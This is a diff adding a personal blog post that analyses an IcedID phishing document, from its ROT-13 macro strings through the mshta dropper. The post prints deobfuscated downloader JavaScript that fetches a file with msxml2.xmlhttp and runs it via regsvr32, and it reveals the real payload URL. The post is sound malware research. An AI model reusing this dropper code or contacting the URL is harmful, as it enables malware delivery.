@@ -1,0 +1,303 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+	<!-- Meta -->
+	<meta charset="UTF-8"/>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+	<meta name="generator" content="Jekyll">
+
+	<!-- Twitter cards -->
+	<meta name="twitter:site"    content="@_nlovin">
+	<meta name="twitter:creator" content="@_nlovin">
+	<meta name="twitter:title"   content="Analysing IcedId: The macro and Mshta">
+
+	
+	<meta name="twitter:description" content="Analysing the macro and Mshta in the docx file">
+	
+
+	
+	<meta name="twitter:card"  content="summary">
+	<meta name="twitter:image" content="">
+	
+	<!-- end of Twitter cards -->
+
+
+
+	<title>Analysing IcedId: The macro and Mshta</title>
+	<meta name="description" content="I write things that might be useful">
+
+	<!-- CSS & fonts -->
+	<link rel="stylesheet" href="/css/main.css">
+
+	<!-- RSS -->
+	<link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" />
+
+  <!-- Favicon -->
+  <link rel="shortcut icon" type="image/png" href="img/favicon.png">
+
+</head>
+
+
+<body>
+	<div id="wrap">
+	  	
+	  	<!-- Navigation -->
+	  	<nav id="nav">
+	<div id="nav-list">
+		<a href="//">Home</a>
+
+		<!-- Nav pages -->
+	  
+	    
+	  
+	    
+	      <a href="/about" title="About">About</a>
+	    
+	  
+	    
+	  
+	    
+	  
+	    
+	  
+	    
+	  
+	    
+	  
+    
+    <!-- Nav links -->
+	  
+
+	</div>
+  
+  <!-- Nav footer -->
+	
+	  
+
+	
+
+</nav>
+
+    
+    <!-- Icon menu -->
+	  <a id="nav-menu">
+	  	<div id="menu"></div>
+	  </a>
+
+      <!-- Header -->
+      
+        <header id="header" class="parent justify-spaceBetween">
+  <div class="inner w100 relative">
+    <span class="f-left">  
+      <a href="//">
+        <h1>
+          <span>nic-</span>lovin
+        </h1>
+      </a>
+    </span>
+    <span id="nav-links" class="absolute right bottom">
+      <!-- Nav pages -->
+	    
+	      
+	    
+	      
+	        <a href="/about" title="About">About</a>
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+	      
+	    
+      
+      <!-- Nav links -->
+	    
+
+    </span>
+  </div>
+</header>
+
+
+
+
+      
+
+    <!-- Main content -->
+	  <div id="container">
+		  
+		<main>
+
+			<article id="post-page">
+	<h2>Analysing IcedId: The macro and Mshta</h2>		
+	<time datetime="2020-09-05T17:40:00-04:00" class="by-line">05 Sep 2020</time>
+	<div class="content">
+
+		<h2 id="analysing-icedid-malware">Analysing IcedID malware</h2>
+
+<h3 id="context">Context</h3>
+<p>I was looking up for a malware to analyse just for fun. One day, I’ve saw a post on twitter from <a href="https://twitter.com/reecdeep/status/1300432198135418880">Suspicious Link</a>, when there was a link to the <a href="https://app.any.run/tasks/d52f66be-14f1-47fc-ad3b-77c89c0e2b77/">app.any.run</a> sample. I thought it would be an opportunity to check out the sample. I’ll describe in future posts the analysis. This first part is quite incomplete as the macro and the Mshta are really simple - I was expecting more work to do.</p>
+
+<p>The md5 hash file is <code class="highlighter-rouge">87e3a3829c723650bea2110ea75a43cd</code>.</p>
+
+<h3 id="casual-phishing">Casual phishing</h3>
+<p>By opening the <code class="highlighter-rouge">doc</code> file, we are greeted with the classic “Please run the macro”. Let’s just dive into the macro.</p>
+
+<h3 id="lolz-at-the-encoding">Lolz at the encoding</h3>
+<p>When looking at the strings in the macro, we can see at least three that catch the eye.</p>
+
+<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Public</span> <span class="k">Const</span> <span class="nv">al9h8L</span> <span class="ow">As</span> <span class="kt">String</span> <span class="o">=</span> <span class="s">"p_:_\_j_v_a_q_b_j_f_\_f_l_f_g_r_z_3_2_\_z_f_u_g_n_._r_k_r_"</span>
+<span class="k">Public</span> <span class="k">Const</span> <span class="nv">as2QC</span> <span class="ow">As</span> <span class="kt">String</span> <span class="o">=</span> <span class="s">"P_:_\_h_f_r_e_f_\_c_h_o_y_v_p_\_v_a_._p_b_z_"</span>
+<span class="k">Public</span> <span class="k">Const</span> <span class="nv">akJ8O5</span> <span class="ow">As</span> <span class="kt">String</span> <span class="o">=</span> <span class="s">"P_:_\_h_f_r_e_f_\_c_h_o_y_v_p_\_v_a_._u_g_z_y_"</span>
+</code></pre></div></div>
+
+<p>Using our experimented ctfs skills, we can guess a ROT encoding.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c_:_\_w_i_n_d_o_w_s_\_s_y_s_t_e_m_3_2_\_m_s_h_t_a_._e_x_e_
+C_:_\_u_s_e_r_s_\_p_u_b_l_i_c_\_i_n_._c_o_m_
+C_:_\_u_s_e_r_s_\_p_u_b_l_i_c_\_i_n_._h_t_m_l_
+</code></pre></div></div>
+
+<p>And it is indeed a ROT-13 encoding. From this point, another wild guess is the macro will create a <code class="highlighter-rouge">html</code> file and will execute <code class="highlighter-rouge">mshta</code> on that file, probably dropping another file on the filesystem. There’s a big blob of text in the <code class="highlighter-rouge">UserForm1</code>, starting with <code class="highlighter-rouge">&lt;!QBPGLCR</code>, which again translates to <code class="highlighter-rouge">DOCTYPE</code> using the rot-13. We can get the content and translate it using our vim foo, <code class="highlighter-rouge">g?</code>.</p>
+
+<h3 id="quick-and-dirty-mshta-analysis">Quick and dirty mshta analysis</h3>
+
+<p><em>Reversing</em> the <code class="highlighter-rouge">html</code> file can be done within minutes. I’ll explain how I did it, and a more thorough analysis will follow some day.</p>
+
+<p>There’s <code class="highlighter-rouge">p</code> element containing what seems to be a hex encoded blob, starting with</p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;p</span> <span class="na">id=</span><span class="s">"content"</span><span class="nt">&gt;</span>616e75637272416e756372725[...]<span class="nt">&lt;/p&gt;</span>
+</code></pre></div></div>
+
+<p>This blob should be used somewhere, and we can follow the reference. Another thing is that there’s only one function in the JavaScript, and it only converts a string passed in parameter.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="nx">aQp7I</span><span class="p">(</span><span class="nx">aXmFa</span><span class="p">)</span>
+<span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">al3VX</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+        <span class="k">for</span><span class="p">(</span><span class="kd">var</span> <span class="nx">a8tBHG</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">a8tBHG</span> <span class="o">&lt;</span> <span class="nx">aXmFa</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">a8tBHG</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span>
+        <span class="p">{</span>
+                <span class="nx">al3VX</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">aXmFa</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">a8tBHG</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">));</span>
+        <span class="p">}</span>
+        <span class="k">return</span><span class="p">(</span><span class="nx">al3VX</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>By adding a <code class="highlighter-rouge">console.log(al3VX);</code> right before the <code class="highlighter-rouge">return</code>, one can get the output of the function.</p>
+
+<p>By following the <code class="highlighter-rouge">content</code> tag, we will first get to <code class="highlighter-rouge">var aGml5p = document.getElementById("content");</code>. Following the <code class="highlighter-rouge">aGml5p</code> variable, we get to <code class="highlighter-rouge">amqBO.RegWrite(a8X0v, aGml5p.innerHTML, "REG_SZ");</code>. So, the file will create a registry key and put the value of <code class="highlighter-rouge">content</code> in it. Following references to <code class="highlighter-rouge">amqBO</code> lead to <code class="highlighter-rouge">a8fnhv = amqBO.RegRead(a8X0v)</code>. This can be simplified as <code class="highlighter-rouge">a8fnhv = content</code>.</p>
+
+<p>Next, <code class="highlighter-rouge">a8fnhv = aQp7I(a8fnhv);</code>. Our function is called! What happens next: <code class="highlighter-rouge">a8fnhv = a8fnhv.replace(/nucrr/ig, "");</code>, then <code class="highlighter-rouge">var azKf2 = new Function("u", "c", a8fnhv);</code>. Let’s see what’s the result of the content after being passed to the <code class="highlighter-rouge">aQp7I</code> function and after the regex removes some <code class="highlighter-rouge">nucrr</code> occurrences.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">aAT1V6</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">avN2J</span> <span class="o">=</span> <span class="s2">"aBUo3"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aZAeCP</span> <span class="o">=</span> <span class="nx">avN2J</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nx">ar9sv</span><span class="p">(</span><span class="nx">ahf1a</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">avFW1R</span> <span class="o">=</span> <span class="s2">""</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">axF8yP</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">axF8yP</span> <span class="o">&lt;</span> <span class="nx">ahf1a</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span> <span class="nx">axF8yP</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">avFW1R</span> <span class="o">+=</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">ahf1a</span><span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">axF8yP</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">));</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="p">(</span><span class="nx">avFW1R</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">aqNek</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="nx">aFM47o</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="nx">akS0L</span> <span class="o">=</span> <span class="mi">30444</span><span class="p">;</span>
+
+<span class="kd">function</span> <span class="nx">a2uAHR</span><span class="p">(</span><span class="nx">avFW1R</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="p">(</span><span class="nx">avFW1R</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s2">""</span><span class="p">).</span><span class="nx">reverse</span><span class="p">().</span><span class="nx">join</span><span class="p">(</span><span class="s2">""</span><span class="p">));</span>
+<span class="p">}</span>
+<span class="kd">var</span> <span class="nx">aAgDpY</span> <span class="o">=</span> <span class="o">-</span><span class="mi">38781</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">a8D1v</span> <span class="o">=</span> <span class="mi">47284</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">ae2PS</span> <span class="o">=</span> <span class="mi">12708</span><span class="p">;</span>
+<span class="nx">aZacTF</span> <span class="o">=</span> <span class="s2">"anUX4L"</span><span class="p">;</span>
+<span class="nx">a5WNsd</span> <span class="o">=</span> <span class="nx">aZacTF</span><span class="p">.</span><span class="nx">toLowerCase</span><span class="p">();</span>
+<span class="kd">var</span> <span class="nx">avAZG</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">"msxml2.xmlhttp"</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">aZHhk</span> <span class="o">=</span> <span class="o">-</span><span class="mi">12863</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">apgUz</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aGnoB</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">"adodb.stream"</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">aFqyH</span> <span class="o">=</span> <span class="s2">"aiXJ3"</span><span class="p">;</span>
+<span class="nx">a8Nh59</span> <span class="o">=</span> <span class="nx">aFqyH</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">();</span>
+<span class="nx">aYdVD</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="nx">apeFM</span> <span class="o">=</span> <span class="o">-</span><span class="mi">58349</span><span class="p">;</span>
+<span class="nx">am5UGu</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">arfAe</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ActiveXObject</span><span class="p">(</span><span class="s2">"wscript.shell"</span><span class="p">);</span>
+<span class="nx">aLzZH7</span> <span class="o">=</span> <span class="s2">"aiPOsk"</span><span class="p">;</span>
+<span class="nx">a0zBvV</span> <span class="o">=</span> <span class="nx">aLzZH7</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">();</span>
+<span class="nx">avc2fk</span> <span class="o">=</span> <span class="s2">"aG2REl"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aLhWt</span> <span class="o">=</span> <span class="nx">avc2fk</span><span class="p">.</span><span class="nx">toUpperCase</span><span class="p">();</span>
+<span class="nx">advOnm</span> <span class="o">=</span> <span class="nx">arfAe</span><span class="p">.</span><span class="nx">expandenvironmentstrings</span><span class="p">(</span><span class="s2">"%temp%"</span><span class="p">);</span>
+<span class="kd">var</span> <span class="nx">a4btjU</span> <span class="o">=</span> <span class="s2">"aSbLM"</span><span class="p">;</span>
+<span class="nx">arpdw4</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">a72X8Q</span> <span class="o">=</span> <span class="o">-</span><span class="mi">9230</span><span class="p">;</span>
+<span class="nx">a1TIE</span> <span class="o">=</span> <span class="s2">"ackdmA"</span><span class="p">;</span>
+<span class="nx">aDyvj</span> <span class="o">=</span> <span class="nx">a1TIE</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+<span class="nx">aqzl3</span> <span class="o">=</span> <span class="o">-</span><span class="mi">10026</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">a7bNS</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aWI9yB</span> <span class="o">=</span> <span class="o">-</span><span class="mi">30060</span><span class="p">;</span>
+<span class="nx">asC6iW</span> <span class="o">=</span> <span class="nx">advOnm</span> <span class="o">+</span> <span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mi">92</span><span class="p">)</span> <span class="o">+</span> <span class="s2">"temp.tmp"</span><span class="p">;</span>
+<span class="nx">aH3r4a</span> <span class="o">=</span> <span class="mi">6567</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aTrpB8</span> <span class="o">=</span> <span class="mi">29087</span><span class="p">;</span>
+<span class="nx">a7fBn</span> <span class="o">=</span> <span class="s2">"azidx0"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">auyeo</span> <span class="o">=</span> <span class="nx">a7fBn</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+<span class="nx">aWg3M5</span> <span class="o">=</span> <span class="s2">"aga8Eq"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aeoOT</span> <span class="o">=</span> <span class="nx">aWg3M5</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+<span class="nx">u</span> <span class="o">=</span> <span class="nx">a2uAHR</span><span class="p">(</span><span class="nx">u</span><span class="p">);</span>
+<span class="nx">u</span> <span class="o">=</span> <span class="nx">ar9sv</span><span class="p">(</span><span class="nx">u</span><span class="p">);</span>
+<span class="nx">amgJz</span> <span class="o">=</span> <span class="s2">"ab3kae"</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aq6RX4</span> <span class="o">=</span> <span class="mi">27911</span><span class="p">;</span>
+<span class="nx">a4XbQ</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="nx">alWXi4</span> <span class="o">=</span> <span class="mi">17174</span><span class="p">;</span>
+<span class="kd">var</span> <span class="nx">aomJe</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+<span class="nx">avAZG</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span> <span class="nx">u</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+<span class="p">[...]</span>
+</code></pre></div></div>
+
+<p>Quickly, we can assume a HTTP request will be made, because of the <code class="highlighter-rouge">var avAZG = new ActiveXObject("msxml2.xmlhttp");</code>. It might also execute a PE file using the <code class="highlighter-rouge">arfAe.run("regsvr32 " + asC6iW)</code>. We can beautify the new JavaScript blob and read it. Two functions exist, and both are easy to understand (<code class="highlighter-rouge">ar9sv</code> and <code class="highlighter-rouge">a2uAHR</code>).</p>
+
+<p>As the JavaScript code is only a hundred long lines, let’s check out where <code class="highlighter-rouge">avAZG</code> is used. <code class="highlighter-rouge">avAZG.open("GET", u, 0);</code>, and what is the <code class="highlighter-rouge">u</code> variable? <code class="highlighter-rouge">u = a2uAHR(u); u = ar9sv(u);</code>. <code class="highlighter-rouge">u</code> seems to be undefined. Let’s go back to the other html part. <code class="highlighter-rouge">var azKf2 = new Function("u", "c", a8fnhv);</code>. Good! Where is <code class="highlighter-rouge">azKf2</code> used? <code class="highlighter-rouge">azKf2("261636e203136656c6f6d6d3c6f3078607e257775786f24616071637f2d6f636e296172787a717f2f2a307474786", 0);</code>. Now, let’s just manually pass <code class="highlighter-rouge">261636e203136656c6f6d6d3c6f3078607e257775786f24616071637f2d6f636e296172787a717f2f2a307474786</code> to <code class="highlighter-rouge">azKf2</code> as such, and then run the JavaScript code:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">u</span> <span class="o">=</span> <span class="nx">a2uAHR</span><span class="p">(</span><span class="s2">"261636e203136656c6f6d6d3c6f3078607e257775786f24616071637f2d6f636e296172787a717f2f2a307474786"</span><span class="p">);</span>
+<span class="nx">u</span> <span class="o">=</span> <span class="nx">ar9sv</span><span class="p">(</span><span class="nx">u</span><span class="p">);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">u</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>js test.js 
+http://qzxrqi.com/sapad/huwu.php?l<span class="o">=</span>molef10.cab
+</code></pre></div></div>
+
+<p>And we got our next file!</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>file molef10.cab
+molef10.cab: PE32 executable <span class="o">(</span>DLL<span class="o">)</span> <span class="o">(</span>GUI<span class="o">)</span> Intel 80386, <span class="k">for </span>MS Window
+</code></pre></div></div>
+
+<p>Now shall start the fun!</p>
+
+		
+	</div>
+</article>
+
+
+
+	  </main>
+		
+		  <!-- Pagination links -->
+      
+
+	  </div>
+	    
+	    <!-- Footer -->
+	    
+
+	    <!-- Script -->
+      <script src="/js/main.js"></script>	
+
+
+	</div>
+</body>
+</html>
